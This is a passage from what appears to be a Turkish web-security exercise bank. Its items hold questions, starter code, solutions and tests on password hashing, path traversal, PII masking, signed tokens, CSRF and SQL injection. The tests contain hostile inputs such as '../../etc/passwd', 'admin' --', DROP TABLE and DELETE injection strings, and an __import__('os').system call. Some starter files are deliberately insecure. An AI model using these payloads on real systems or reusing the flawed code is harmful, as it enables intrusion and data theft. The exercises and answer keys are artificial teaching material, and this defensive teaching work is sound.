assert parola_dogrula("1234", parola_ozetle("1234", tur=1000)) is True, "tur parametresi kayda yazılmalı ve doğrulamada kullanılmalı"
''',
  'hints': ['Tuz rastgele ve kullanıcıya özgü olmalı: secrets.token_bytes(16).', 'Kayıt, doğrulama için gereken her şeyi (algoritma, tur, tuz) taşımalı ki tur sayısını ileride artırabilesin.', 'aday = hashlib.pbkdf2_hmac("sha256", parola.encode(), bytes.fromhex(tuz_hex), int(tur))'],
  'why': 'Django\'nun parola alanı da tam olarak bu biçimi kullanır (algoritma$tur$tuz$özet). Parametreleri kayda yazmak, ileride tur sayısını artırdığında eski kayıtları doğrulamaya devam etmeni sağlar.'},
 {'id': 'web-guvenlik-3', 't': 'code', 'stage': 'Rehberli', 'diff': 2,
  'q': '<p><code>guvenli_yol(kok, ad)</code> fonksiyonunu yaz: <code>kok</code> bir <code>Path</code>, <code>ad</code> kullanıcının istediği göreli dosya yoludur. Birleşik yolu <code>resolve()</code> ile çözüp kök klasörün içinde kalıyorsa çözülmüş yolu döndür; dışına çıkıyorsa (<code>..</code>, mutlak yol ya da benzer adlı kardeş klasör) <code>PermissionError</code> fırlat. Boş ad da reddedilsin.</p>',
  'guide': ['Kökü de resolve() ile gerçek yola çevir.', 'Ad boşsa hemen PermissionError fırlat.', '(kok / ad).resolve() ile hedef yolu hesapla.', 'hedef.is_relative_to(kok) değilse ya da hedef kökün kendisiyse PermissionError fırlat.', 'Hedefi döndür.'],
  'example': 'from pathlib import Path\nk = Path("/tmp/a").resolve()\nprint((k / "b/../c.txt").resolve(), (k / "c.txt").resolve().is_relative_to(k))\n',
  'start': r'''from pathlib import Path

def guvenli_yol(kok, ad):
    kok = Path(kok).resolve()
    # TODO: boş adı reddet, yolu çöz, kökün içinde mi kontrol et
    return kok / ad
''',
  'sol': r'''from pathlib import Path

def guvenli_yol(kok, ad):
    kok = Path(kok).resolve()
    if not ad:
        raise PermissionError("boş dosya adı")
    hedef = (kok / ad).resolve()
    if hedef == kok or not hedef.is_relative_to(kok):
        raise PermissionError(f"izin verilmeyen yol: {ad}")
    return hedef
''',
  'tests': r'''import os, tempfile
from pathlib import Path
taban = Path(tempfile.mkdtemp())
kok = taban / "raporlar"
(kok / "2025").mkdir(parents=True)
(taban / "raporlar_gizli").mkdir()
assert guvenli_yol(kok, "2025/ocak.csv") == (kok / "2025" / "ocak.csv").resolve(), "kök içindeki yol çözülmüş haliyle dönmeli"
assert guvenli_yol(kok, "2025/../subat.csv") == (kok / "subat.csv").resolve(), "kök içinde kalan .. serbest"
for kotu in ["../../etc/passwd", "/etc/passwd", "../raporlar_gizli/maas.csv", "", ".", "2025/../.."]:
    try:
        guvenli_yol(kok, kotu)
        assert False, f"{kotu!r} reddedilmeliydi (PermissionError)"
    except PermissionError:
        pass
''',
  'hints': ['Path / "/etc/passwd" mutlak yolla birleşince kökü tamamen atar; resolve sonrası kontrol bunu yakalar.', 'Metin startswith yerine Path.is_relative_to kullan: klasör sınırına bakar.', 'if hedef == kok or not hedef.is_relative_to(kok): raise PermissionError(...)'],
  'why': 'Önce çöz, sonra kontrol et: resolve() .. ve sembolik bağları gerçek yola indirger; is_relative_to klasör sınırlarını karşılaştırır, böylece "raporlar_gizli" gibi kardeş klasörler ve mutlak yollar da yakalanır.'},
 {'id': 'web-guvenlik-4', 't': 'code', 'stage': 'Rehberli', 'diff': 1,
  'q': '<p>KVKK için ekranda ve logda gösterilecek müşteri kaydını maskeleyen <code>maskele_kayit(kayit)</code> fonksiyonunu yaz. Orijinal sözlüğü değiştirmeden yeni sözlük döndürsün:</p><ul><li><code>tc</code>: ilk 3 ve son 2 hane açık, arası <code>*</code> → <code>"123******01"</code></li><li><code>telefon</code>: yalnız son 4 hane açık, öncesi aynı uzunlukta <code>*</code> → <code>"*******4567"</code></li><li><code>eposta</code>: kullanıcı adının ilk harfi + <code>"***"</code> + <code>@</code> + alan adı → <code>"a***@example.com"</code></li><li>Diğer alanlar aynen kalsın; bu üç alandan biri yoksa atlansın.</li></ul>',
  'guide': ['dict(kayit) ile kopya al.', 'Her alan için "kopyada var mı?" kontrolü yap.', 'tc: dilimlerle ilk 3 + "*" * (uzunluk - 5) + son 2.', 'telefon: "*" * (uzunluk - 4) + son 4.', 'eposta: split("@") ile ayır, ilk harf + "***@" + alan.'],
  'example': 'kart = "4543123412341234"\nprint("*" * (len(kart) - 4) + kart[-4:])\n',
  'start': r'''def maskele_kayit(kayit):
    sonuc = dict(kayit)
    # TODO: tc, telefon, eposta alanlarını maskele
    return sonuc
''',
  'sol': r'''def maskele_kayit(kayit):
    sonuc = dict(kayit)
    if "tc" in sonuc:
        tc = sonuc["tc"]
        sonuc["tc"] = tc[:3] + "*" * (len(tc) - 5) + tc[-2:]
    if "telefon" in sonuc:
        t = sonuc["telefon"]
        sonuc["telefon"] = "*" * (len(t) - 4) + t[-4:]
    if "eposta" in sonuc:
        ad, alan = sonuc["eposta"].split("@", 1)
        sonuc["eposta"] = ad[0] + "***@" + alan
    return sonuc
''',
  'tests': r'''k = {"ad": "Ayşe", "tc": "12345678901", "telefon": "05321234567", "eposta": "ayse.kaya@example.com", "il": "İzmir"}
m = maskele_kayit(k)
assert m["tc"] == "123******01", f"tc maskesi hatalı: {m['tc']}"
assert m["telefon"] == "*******4567", f"telefon maskesi hatalı: {m['telefon']}"
assert m["eposta"] == "a***@example.com", f"e-posta maskesi hatalı: {m['eposta']}"
assert m["ad"] == "Ayşe" and m["il"] == "İzmir", "diğer alanlar korunmalı"
assert k["tc"] == "12345678901", "orijinal kayıt değişmemeli"
assert maskele_kayit({"ad": "Can"}) == {"ad": "Can"}, "maskelenecek alan yoksa kayıt aynen dönmeli"
''',
  'hints': ['Kopya üzerinde çalış: sonuc = dict(kayit).', 'Uzunluk korunmalı: "*" * (len(tc) - 5).', 'ad, alan = eposta.split("@", 1)'],
  'why': 'Maskeleme, verinin varlığını ve biçimini gösterip kimliği gizler; müşteri hizmetleri ekranında ve loglarda KVKK\'nın veri minimizasyonu ilkesinin pratik karşılığıdır. Orijinali değiştirmemek, asıl kaydın bozulmasını önler.'},
 {'id': 'web-guvenlik-5', 't': 'code', 'stage': 'Kendin yaz', 'diff': 3,
  'q': '<p>JWT benzeri imzalı token yaz.</p><ul><li><code>token_uret(yuk, anahtar)</code>: <code>yuk</code> sözlüğünü <code>json.dumps(yuk, sort_keys=True)</code> ile metne çevirip base64url (sondaki <code>=</code> dolgusu atılmış) kodlasın; imza = <code>HMAC-SHA256(anahtar, kodlu_yuk)</code>, o da base64url. Sonuç: <code>"kodlu_yuk.kodlu_imza"</code>.</li><li><code>token_dogrula(token, anahtar, simdi)</code>: biçim bozuksa ya da imza tutmuyorsa <code>ValueError("imza")</code>, yükteki <code>exp</code> değeri <code>simdi</code>\'den küçük ya da eşitse <code>ValueError("süre")</code> fırlatsın; aksi halde yük sözlüğünü döndürsün. İmza karşılaştırması sabit zamanlı olsun.</li></ul>',
  'start': 'import base64, hashlib, hmac, json\n\ndef token_uret(yuk, anahtar):\n    pass\n\ndef token_dogrula(token, anahtar, simdi):\n    pass\n',
  'sol': r'''import base64, hashlib, hmac, json

def _b64(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def _b64_coz(s):
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))

def _imza(veri, anahtar):
    return _b64(hmac.new(anahtar, veri.encode(), hashlib.sha256).digest())

def token_uret(yuk, anahtar):
    kodlu = _b64(json.dumps(yuk, sort_keys=True).encode())
    return f"{kodlu}.{_imza(kodlu, anahtar)}"

def token_dogrula(token, anahtar, simdi):
    parcalar = token.split(".")
    if len(parcalar) != 2:
        raise ValueError("imza")
    kodlu, imza = parcalar
    if not hmac.compare_digest(_imza(kodlu, anahtar), imza):
        raise ValueError("imza")
    yuk = json.loads(_b64_coz(kodlu))
    if yuk.get("exp", 0) <= simdi:
        raise ValueError("süre")
    return yuk
''',
  'tests': r'''import base64, json
A = b"cok-gizli-anahtar"
t = token_uret({"sub": "M-101", "rol": "musteri", "exp": 2000}, A)
assert isinstance(t, str) and t.count(".") == 1 and "=" not in t, "token \'yuk.imza\' biçiminde ve dolgusuz olmalı"
assert token_dogrula(t, A, 1500) == {"sub": "M-101", "rol": "musteri", "exp": 2000}, "geçerli token yükü döndürmeli"
def hata(f):
    try:
        f(); return None
    except ValueError as e:
        return str(e)
assert hata(lambda: token_dogrula(t, A, 2000)) == "süre", "exp <= simdi ise süre hatası"
assert hata(lambda: token_dogrula(t, b"baska-anahtar", 1500)) == "imza", "yanlış anahtarla imza tutmamalı"
yuk, imza = t.split(".")
sahte = base64.urlsafe_b64encode(json.dumps({"exp": 2000, "rol": "admin", "sub": "M-101"}, sort_keys=True).encode()).rstrip(b"=").decode()
assert hata(lambda: token_dogrula(sahte + "." + imza, A, 1500)) == "imza", "yükü değiştirilmiş (rol: admin) token reddedilmeli"
assert hata(lambda: token_dogrula("bozuk", A, 1500)) == "imza", "biçimi bozuk token imza hatası vermeli"
assert "compare_digest" in __source__, "imza karşılaştırması hmac.compare_digest ile yapılmalı"
''',
  'hints': ['base64.urlsafe_b64encode(...).rstrip(b"=").decode() kodlar; çözerken dolguyu "=" * (-len(s) % 4) ile geri ekle.', 'İmzayı her zaman kodlu yük metni üzerinden hesapla; doğrularken yeniden hesaplayıp karşılaştır.', 'Önce imzayı doğrula, sonra yükü çözüp exp\'e bak: imzasız veriye güvenme.'],
  'why': 'İmza, yükün anahtar sahibi tarafından üretildiğini ve değiştirilmediğini kanıtlar; yük gizli değildir. Doğrulama sırası önemlidir: önce imza, sonra içerik. sort_keys aynı yükün her zaman aynı metne dönüşmesini sağlar.'},
 {'id': 'web-guvenlik-6', 't': 'code', 'stage': 'Kendin yaz', 'diff': 2,
  'q': '<p>Anadolu Market ürün listesi kullanıcının seçtiği alana göre sıralanıyor. Sütun adı parametreyle verilemediği için izin listesi gerekir. <code>urun_listesi(db, sirala="ad", yon="asc", en_az=0)</code> fonksiyonunu yaz:</p><ul><li><code>sirala</code> yalnız <code>"ad"</code>, <code>"fiyat"</code>, <code>"stok"</code> olabilir; <code>yon</code> yalnız <code>"asc"</code> ya da <code>"desc"</code> (büyük/küçük harf duyarsız). Aksi halde <code>ValueError</code>.</li><li><code>en_az</code> fiyat alt sınırıdır ve <code>?</code> parametresiyle gitmeli.</li><li><code>urun(ad, fiyat, stok)</code> tablosundan ad listesini döndür.</li></ul>',
  'start': 'import sqlite3\n\ndef urun_listesi(db, sirala="ad", yon="asc", en_az=0):\n    pass\n',
  'sol': r'''import sqlite3

SIRALANABILIR = {"ad", "fiyat", "stok"}
YONLER = {"asc": "ASC", "desc": "DESC"}

def urun_listesi(db, sirala="ad", yon="asc", en_az=0):
    if sirala not in SIRALANABILIR:
        raise ValueError(f"sıralanamaz alan: {sirala}")
    yon_sql = YONLER.get(str(yon).lower())
    if yon_sql is None:
        raise ValueError(f"geçersiz yön: {yon}")
    sql = f"SELECT ad FROM urun WHERE fiyat >= ? ORDER BY {sirala} {yon_sql}"
    return [r[0] for r in db.execute(sql, (en_az,))]
''',
  'tests': r'''db = sqlite3.connect(":memory:")
db.execute("CREATE TABLE urun (ad TEXT, fiyat REAL, stok INTEGER)")
db.executemany("INSERT INTO urun VALUES (?, ?, ?)", [("Çay", 120, 40), ("Bardak", 25, 100), ("Kahve", 350, 5)])
assert urun_listesi(db) == ["Bardak", "Kahve", "Çay"], "varsayılan: ada göre artan"
assert urun_listesi(db, "fiyat", "DESC") == ["Kahve", "Çay", "Bardak"], "yön büyük harfle de kabul edilmeli"
assert urun_listesi(db, "stok", "asc", en_az=100) == ["Kahve", "Çay"], "en_az fiyat filtresi"
for s, y in [("fiyat; DROP TABLE urun", "asc"), ("ad", "asc; DELETE FROM urun"), ("sifre", "asc")]:
    try:
        urun_listesi(db, s, y)
        assert False, f"{s!r}/{y!r} reddedilmeli"
    except ValueError:
        pass
try:
    urun_listesi(db, en_az="0 OR 1=1")
except Exception:
    pass
assert db.execute("SELECT COUNT(*) FROM urun").fetchone()[0] == 3, "tablo sağlam kalmalı"
''',
  'hints': ['Değerler ? ile, tanımlayıcılar (sütun adı, ASC/DESC) izin listesiyle korunur.', 'yon için küçük harfe çevirip bir sözlükten SQL karşılığını al; yoksa ValueError.'],
  'why': 'Parametre yalnız değerler için çalışır; ORDER BY sütunu ve yönü SQL metnine girmek zorundadır. Bu yüzden onları kullanıcı girdisinden değil, kendi tanımladığın sabit kümeden seçersin.'},
 {'id': 'web-guvenlik-7', 't': 'code', 'stage': 'Kendin yaz', 'diff': 2,
  'q': '<p>Analiz ekibine KVKK uyumlu veri hazırla. <code>anonimlestir(kayitlar, anahtar)</code> fonksiyonunu yaz; her kayıt <code>{"ad", "tc", "yas", "il", "tutar"}</code> içerir. Çıktıdaki her kayıt yalnız şu alanları taşısın:</p><ul><li><code>kisi</code>: <code>"K-"</code> + HMAC-SHA256(anahtar, tc) hex özetinin ilk 12 karakteri (takma ad: aynı kişi aynı değeri alır)</li><li><code>yas_grubu</code>: <code>"18-29"</code>, <code>"30-44"</code>, <code>"45-64"</code>, <code>"65+"</code> (18 altı <code>"0-17"</code>)</li><li><code>il</code> ve <code>tutar</code> aynen</li></ul><p><code>ad</code> ve <code>tc</code> çıktıda hiçbir biçimde yer almasın.</p>',
  'start': 'import hmac, hashlib\n\ndef anonimlestir(kayitlar, anahtar):\n    pass\n',
  'sol': r'''import hmac, hashlib

def _yas_grubu(yas):
    if yas < 18:
        return "0-17"
    if yas < 30:
        return "18-29"
    if yas < 45:
        return "30-44"
    if yas < 65:
        return "45-64"
    return "65+"

def anonimlestir(kayitlar, anahtar):
    sonuc = []
    for k in kayitlar:
        kisi = "K-" + hmac.new(anahtar, k["tc"].encode(), hashlib.sha256).hexdigest()[:12]
        sonuc.append({"kisi": kisi, "yas_grubu": _yas_grubu(k["yas"]), "il": k["il"], "tutar": k["tutar"]})
    return sonuc
''',
  'tests': r'''import hmac, hashlib
A = b"analiz-anahtari"
veri = [
    {"ad": "Ayşe Kaya", "tc": "12345678901", "yas": 34, "il": "İzmir", "tutar": 1500},
    {"ad": "Can Demir", "tc": "10987654321", "yas": 67, "il": "Ankara", "tutar": 300},
    {"ad": "Ayşe Kaya", "tc": "12345678901", "yas": 34, "il": "İzmir", "tutar": 250},
    {"ad": "Ece Ak", "tc": "11111111110", "yas": 29, "il": "Bursa", "tutar": 90},
]
s = anonimlestir(veri, A)
assert len(s) == 4 and set(s[0]) == {"kisi", "yas_grubu", "il", "tutar"}, f"yalnız kisi, yas_grubu, il, tutar alanları olmalı; gelen {set(s[0])}"
beklenen = "K-" + hmac.new(A, b"12345678901", hashlib.sha256).hexdigest()[:12]
assert s[0]["kisi"] == beklenen, "takma ad HMAC-SHA256 hex özetinin ilk 12 karakteri olmalı"
assert s[0]["kisi"] == s[2]["kisi"] and s[0]["kisi"] != s[1]["kisi"], "aynı kişi aynı, farklı kişi farklı takma ad almalı"
assert [r["yas_grubu"] for r in s] == ["30-44", "65+", "30-44", "18-29"], "yaş grupları hatalı"
assert "12345678901" not in str(s) and "Ayşe" not in str(s), "tc ve ad çıktıda hiçbir biçimde yer almamalı"
assert anonimlestir(veri, b"baska")[0]["kisi"] != beklenen, "anahtar değişince takma ad değişmeli (anahtarsız geri dönüş yok)"
''',
  'hints': ['hmac.new(anahtar, tc.encode(), hashlib.sha256).hexdigest()[:12]', 'Yaş grubu için sıralı if zinciri: < 18, < 30, < 45, < 65, aksi 65+.'],
  'why': 'Anahtarlı özet (HMAC) düz SHA-256\'dan farklı olarak sözlük saldırısına dayanır: 11 haneli TC uzayı küçüktür ve anahtarsız özet kolayca tersine çevrilebilir. Yaşı aralığa çevirmek (genelleme) yeniden tanımlama riskini azaltır.'},
 {'id': 'web-guvenlik-8', 't': 'code', 'stage': 'Kendin yaz', 'diff': 2,
  'q': '<p>Oturuma bağlı CSRF token üret ve doğrula.</p><ul><li><code>csrf_uret(oturum_id, anahtar, zaman)</code>: <code>f"{zaman}.{imza}"</code> döndürsün; imza = <code>HMAC-SHA256(anahtar, f"{oturum_id}|{zaman}")</code> hex özeti.</li><li><code>csrf_dogrula(token, oturum_id, anahtar, simdi, omur=3600)</code>: imza bu oturum için tutuyorsa ve token <code>omur</code> saniyeden eski değilse (ve gelecekten değilse) <code>True</code>, aksi halde <code>False</code> döndürsün. Bozuk biçimde hata fırlatma, <code>False</code> dön. Sabit zamanlı karşılaştır.</li></ul>',
  'start': 'import hmac, hashlib\n\ndef csrf_uret(oturum_id, anahtar, zaman):\n    pass\n\ndef csrf_dogrula(token, oturum_id, anahtar, simdi, omur=3600):\n    pass\n',
  'sol': r'''import hmac, hashlib

def _imza(oturum_id, anahtar, zaman):
    return hmac.new(anahtar, f"{oturum_id}|{zaman}".encode(), hashlib.sha256).hexdigest()

def csrf_uret(oturum_id, anahtar, zaman):
    return f"{zaman}.{_imza(oturum_id, anahtar, zaman)}"

def csrf_dogrula(token, oturum_id, anahtar, simdi, omur=3600):
    try:
        zaman_s, imza = token.split(".")
        zaman = int(zaman_s)
    except (ValueError, AttributeError):
        return False
    if not hmac.compare_digest(_imza(oturum_id, anahtar, zaman), imza):
        return False
    return 0 <= simdi - zaman <= omur
''',
  'tests': r'''A = b"csrf-anahtari"
t = csrf_uret("oturum-abc", A, 1000)
assert t.startswith("1000.") and len(t) == 5 + 64, "token \'zaman.hex_imza\' biçiminde olmalı"
assert csrf_dogrula(t, "oturum-abc", A, 1500) is True, "aynı oturum, süre içinde: True"
assert csrf_dogrula(t, "oturum-xyz", A, 1500) is False, "başka oturumun token\'ı kabul edilmemeli"
assert csrf_dogrula(t, "oturum-abc", A, 1000 + 3601) is False, "ömrü dolan token reddedilmeli"
assert csrf_dogrula(t, "oturum-abc", A, 900) is False, "gelecekten gelen token reddedilmeli"
assert csrf_dogrula("2000." + t.split(".")[1], "oturum-abc", A, 2100) is False, "zamanı değiştirilmiş token reddedilmeli"
assert csrf_dogrula("bozuk", "oturum-abc", A, 1500) is False and csrf_dogrula(None, "oturum-abc", A, 1500) is False, "bozuk girdi False dönmeli, hata fırlatmamalı"
assert "compare_digest" in __source__, "hmac.compare_digest kullan"
''',
  'hints': ['İmzaya hem oturum kimliğini hem zamanı kat; böylece ikisi de değiştirilemez.', 'split ve int dönüşümünü try içine al; None.split AttributeError verir.', 'Süre kontrolü: 0 <= simdi - zaman <= omur'],
  'why': 'Token oturuma bağlandığı için başka bir kullanıcının token\'ı işe yaramaz; zaman damgası imzanın içinde olduğundan saldırgan süreyi uzatamaz. Django\'nun CSRF ve parola sıfırlama token\'ları da benzer HMAC tabanlı tasarım kullanır.'},
 {'id': 'web-guvenlik-9', 't': 'code', 'stage': 'Hata avı', 'kind': 'bug', 'diff': 2,
  'q': '<p>Hatayı bul ve düzelt. Ilgaz Bank\'ın <code>giris(db, kullanici, parola_ozeti)</code> fonksiyonu kullanıcı adı ve parola özeti eşleşirse kullanıcının <code>id</code>\'sini, eşleşmezse <code>None</code> döndürmeli. Sızma testinde kullanıcı adı alanına <code>admin\' --</code> yazılarak parolasız giriş yapıldı. Sorguyu güvenli hale getir.</p>',
  'start': r'''import sqlite3

def giris(db, kullanici, parola_ozeti):
    sql = f"SELECT id FROM kullanici WHERE ad = '{kullanici}' AND ozet = '{parola_ozeti}'"
    satir = db.execute(sql).fetchone()
    return satir[0] if satir else None
''',
  'sol': r'''import sqlite3

def giris(db, kullanici, parola_ozeti):
    sql = "SELECT id FROM kullanici WHERE ad = ? AND ozet = ?"
    satir = db.execute(sql, (kullanici, parola_ozeti)).fetchone()
    return satir[0] if satir else None
''',
  'tests': r'''db = sqlite3.connect(":memory:")
db.execute("CREATE TABLE kullanici (id INTEGER, ad TEXT, ozet TEXT)")
db.executemany("INSERT INTO kullanici VALUES (?, ?, ?)", [(1, "admin", "a1b2"), (2, "o\'neil", "c3d4")])
assert giris(db, "admin", "a1b2") == 1, "doğru bilgilerle giriş çalışmalı"
assert giris(db, "admin", "yanlis") is None, "yanlış özet None"
assert giris(db, "admin\' --", "herhangi") is None, "yorum satırı enjeksiyonu (admin\' --) engellenmeli"
assert giris(db, "x\' OR \'1\'=\'1\' --", "") is None, "OR 1=1 enjeksiyonu engellenmeli"
assert giris(db, "o\'neil", "c3d4") == 2, "adında kesme işareti olan meşru kullanıcı da giriş yapabilmeli"
''',
  'hints': ['f-string ile SQL kurmak, kullanıcının tırnak kapatıp kendi SQL\'ini yazmasına izin verir.', 'Yer tutucu kullan: "... WHERE ad = ? AND ozet = ?" ve değerleri ikinci argümanda demet olarak ver.'],
  'why': '"admin\' --" girdisi tırnağı kapatır ve -- ile sorgunun geri kalanını (parola kontrolü) yoruma çevirir. Parametreli sorguda tüm girdi tek bir değerdir; ayrıca o\'neil gibi meşru adlar da sorunsuz çalışır.'},
 {'id': 'web-guvenlik-10', 't': 'code', 'stage': 'Hata avı', 'kind': 'bug', 'diff': 2,
  'q': '<p>Hatayı bul ve düzelt. Bir stajyerin yazdığı parola saklama kodu testlerden geçiyor ama güvenlik incelemesinde üç sorun bulundu: tuz tüm kullanıcılar için aynı, özet tek tur SHA-256 (çok hızlı), karşılaştırma <code>==</code> ile yapılıyor. <code>kayit_olustur(parola)</code> ve <code>dogrula(parola, kayit)</code> fonksiyonlarının <b>arayüzünü koruyarak</b> düzelt: kayıt <code>{"tuz": hex, "ozet": hex, "tur": int}</code> sözlüğü olsun; her kayıtta <code>secrets</code> ile 16 baytlık farklı tuz, en az 10000 turluk <code>pbkdf2_hmac</code> ve <code>hmac.compare_digest</code> kullan.</p>',
  'start': r'''import hashlib

TUZ = "ilgaz_bank"

def kayit_olustur(parola):
    ozet = hashlib.sha256((TUZ + parola).encode()).hexdigest()
    return {"tuz": TUZ.encode().hex(), "ozet": ozet, "tur": 1}

def dogrula(parola, kayit):
    tuz = bytes.fromhex(kayit["tuz"]).decode()
    return hashlib.sha256((tuz + parola).encode()).hexdigest() == kayit["ozet"]
''',
  'sol': r'''import hashlib, hmac, secrets

TUR = 10000

def kayit_olustur(parola):
    tuz = secrets.token_bytes(16)
    ozet = hashlib.pbkdf2_hmac("sha256", parola.encode(), tuz, TUR)
    return {"tuz": tuz.hex(), "ozet": ozet.hex(), "tur": TUR}

def dogrula(parola, kayit):
    tuz = bytes.fromhex(kayit["tuz"])
    aday = hashlib.pbkdf2_hmac("sha256", parola.encode(), tuz, kayit["tur"])
    return hmac.compare_digest(aday.hex(), kayit["ozet"])
''',
  'tests': r'''a = kayit_olustur("Gizli!2025")
b = kayit_olustur("Gizli!2025")
assert dogrula("Gizli!2025", a) is True and dogrula("gizli!2025", a) is False, "doğrulama doğru çalışmalı"
assert a["tuz"] != b["tuz"], "her kayıt kendi rastgele tuzunu almalı"
assert a["ozet"] != b["ozet"], "aynı parola farklı kullanıcılarda farklı özet üretmeli"
assert len(bytes.fromhex(a["tuz"])) >= 16, "tuz en az 16 bayt olmalı"
assert a["tur"] >= 10000, "en az 10000 tur PBKDF2 kullanılmalı"
assert "pbkdf2_hmac" in __source__ and "compare_digest" in __source__ and "secrets" in __source__, "pbkdf2_hmac, secrets ve hmac.compare_digest kullanılmalı"
''',
  'hints': ['Sabit tuz, aynı parolalı kullanıcıları ele verir ve tek bir önceden hesaplanmış tabloyla hepsine saldırılabilir.', 'secrets.token_bytes(16) + hashlib.pbkdf2_hmac("sha256", parola.encode(), tuz, TUR); doğrulamada kayit["tur"] kullan.'],
  'why': 'Üç katmanlı düzeltme: kullanıcıya özgü rastgele tuz (tablo saldırılarına karşı), yavaş yinelemeli özet (kaba kuvvete karşı), sabit zamanlı karşılaştırma (zamanlama sızıntısına karşı). Kodun testleri geçmesi güvenli olduğu anlamına gelmez; güvenlik gereksinimleri de test edilmelidir.'},
 {'id': 'web-guvenlik-11', 't': 'code', 'stage': 'Meydan okuma', 'diff': 3,
  'q': '<p>Kullanıcıların kampanya formülü girebildiği bir ekran için <code>eval</code> yerine güvenli bir değerlendirici yaz: <code>guvenli_hesapla(ifade, degiskenler)</code>. <code>ast.parse(ifade, mode="eval")</code> ile ağacı al ve yalnız şunlara izin ver: sayı sabitleri (int/float), <code>degiskenler</code> sözlüğündeki adlar, ikili işlemler <code>+ - * / %</code>, tekli eksi, parantez. Başka her şeyde (fonksiyon çağrısı, öznitelik erişimi, bilinmeyen ad, metin sabiti, <code>**</code>, karşılaştırma) <code>ValueError</code> fırlat. Sözdizimi hatası da <code>ValueError</code> olsun.</p><p>Örnek: <code>guvenli_hesapla("tutar * (1 - oran) + kargo", {"tutar": 200, "oran": 0.1, "kargo": 30})</code> → <code>210.0</code></p>',
  'start': 'import ast\n\ndef guvenli_hesapla(ifade, degiskenler):\n    pass\n',
  'sol': r'''import ast, operator

IKILI = {ast.Add: operator.add, ast.Sub: operator.sub, ast.Mult: operator.mul,
         ast.Div: operator.truediv, ast.Mod: operator.mod}

def guvenli_hesapla(ifade, degiskenler):
    try:
        agac = ast.parse(ifade, mode="eval")
    except SyntaxError as e:
        raise ValueError(f"sözdizimi hatası: {e}") from None

    def hesapla(d):
        if isinstance(d, ast.Expression):
            return hesapla(d.body)
        if isinstance(d, ast.Constant) and type(d.value) in (int, float):
            return d.value
        if isinstance(d, ast.Name):
            if d.id not in degiskenler:
                raise ValueError(f"bilinmeyen ad: {d.id}")
            return degiskenler[d.id]
        if isinstance(d, ast.BinOp) and type(d.op) in IKILI:
            return IKILI[type(d.op)](hesapla(d.left), hesapla(d.right))
        if isinstance(d, ast.UnaryOp) and isinstance(d.op, ast.USub):
            return -hesapla(d.operand)
        raise ValueError(f"izin verilmeyen ifade: {type(d).__name__}")

    return hesapla(agac)
''',
  'tests': r'''v = {"tutar": 200, "oran": 0.1, "kargo": 30}
assert abs(guvenli_hesapla("tutar * (1 - oran) + kargo", v) - 210.0) < 1e-9, "örnek formül 210.0 vermeli"
assert guvenli_hesapla("-tutar % 7 + 2", v) == (-200 % 7) + 2, "tekli eksi ve mod desteklenmeli"
assert guvenli_hesapla("3", {}) == 3, "tek sabit"
kotuler = ["__import__(\'os\').system(\'ls\')", "tutar.__class__", "open(\'x\')", "2 ** 1000000", "tutar > 5", "\'a\' * 3", "bilinmeyen + 1", "tutar +", "[1, 2]", "True + 1"]
for k in kotuler:
    try:
        guvenli_hesapla(k, v)
        assert False, f"{k!r} reddedilmeliydi"
    except ValueError:
        pass
    except Exception as e:
        assert False, f"{k!r} için ValueError beklenirken {type(e).__name__} geldi"
''',
  'hints': ['Özyinelemeli bir hesapla(dugum) yaz; her düğüm türünü açıkça ele al, gerisini reddet (izin listesi).', 'ast.Constant\'ta type(d.value) in (int, float) kontrolü True/False ve metinleri dışarıda bırakır (bool, int\'in alt sınıfıdır).', 'İşlemler için {ast.Add: operator.add, ...} eşlemesi; ** (ast.Pow) bilerek listede yok: devasa sayılarla hizmet dışı bırakmaya yol açar.'],
  'why': 'eval\'in yerine "yasaklıları ayıkla" yaklaşımı her zaman bir kaçış yolu bırakır; ağaç üzerinde izin listesiyle yürümek ise yalnız tanımladığın dili çalıştırır. Üs alma gibi masum görünen işlemler bile kaynak tüketimiyle (DoS) saldırıya dönüşebilir.'},
 {'id': 'web-guvenlik-12', 't': 'code', 'stage': 'Meydan okuma', 'diff': 3,
  'q': '<p>Log satırlarına gizli bilgi sızıyor. <code>log_temizle(satir)</code> fonksiyonunu yaz; şu dönüşümleri uygulayıp temiz satırı döndürsün:</p><ul><li><code>parola=...</code>, <code>password=...</code>, <code>token=...</code> (anahtar büyük/küçük harf duyarsız): değer boşluk, <code>&amp;</code> ya da satır sonuna kadar <code>***</code> olur → <code>parola=***</code></li><li><code>Authorization: Bearer XXXXX</code> → <code>Authorization: Bearer ***</code></li><li>13-19 haneli kart numaraları (arada boşluk ya da tire olabilir): yalnız son 4 hane kalır, önüne <code>**** </code> → <code>**** 1234</code></li><li>11 haneli TC kimlik numaraları (sözcük sınırında, başka rakama bitişik olmayan): <code>***********</code> (11 yıldız)</li></ul>',
  'start': 'import re\n\ndef log_temizle(satir):\n    return satir\n',
  'sol': r'''import re

ANAHTAR = re.compile(r"(?i)\b(parola|password|token)=([^\s&]+)")
BEARER = re.compile(r"(?i)(Authorization:\s*Bearer\s+)\S+")
KART = re.compile(r"(?<!\d)(?:\d[ -]?){12,18}\d(?!\d)")
TC = re.compile(r"(?<!\d)\d{11}(?!\d)")

def _kart(m):
    rakamlar = re.sub(r"\D", "", m.group(0))
    if not 13 <= len(rakamlar) <= 19:
        return m.group(0)
    return "**** " + rakamlar[-4:]

def log_temizle(satir):
    satir = ANAHTAR.sub(lambda m: m.group(1) + "=***", satir)
    satir = BEARER.sub(lambda m: m.group(1) + "***", satir)
    satir = TC.sub("*" * 11, satir)
    satir = KART.sub(_kart, satir)
    return satir
''',
  'tests': r'''assert log_temizle("GET /giris?kullanici=ayse&parola=Gizli123&dil=tr") == "GET /giris?kullanici=ayse&parola=***&dil=tr", "parola değeri & öncesine kadar maskelenmeli"
assert log_temizle("PASSWORD=abc TOKEN=xyz") == "PASSWORD=*** TOKEN=***", "anahtar adı harf duyarsız"
assert log_temizle("Authorization: Bearer eyJhbGciOi.abc.def istek ok") == "Authorization: Bearer *** istek ok", "Bearer token maskelenmeli"
assert log_temizle("ödeme kart=4543 1234 5678 9012 tutar=150") == "ödeme kart=**** 9012 tutar=150", "boşluklu kart numarası"
assert log_temizle("kart 4543-1234-5678-9012") == "kart **** 9012", "tireli kart numarası"
assert log_temizle("musteri tc 12345678901 basvuru") == "musteri tc *********** basvuru", "TC 11 yıldız olmalı"
assert log_temizle("siparis 2025 adet 3 tutar 1499.90") == "siparis 2025 adet 3 tutar 1499.90", "zararsız sayılar değişmemeli"
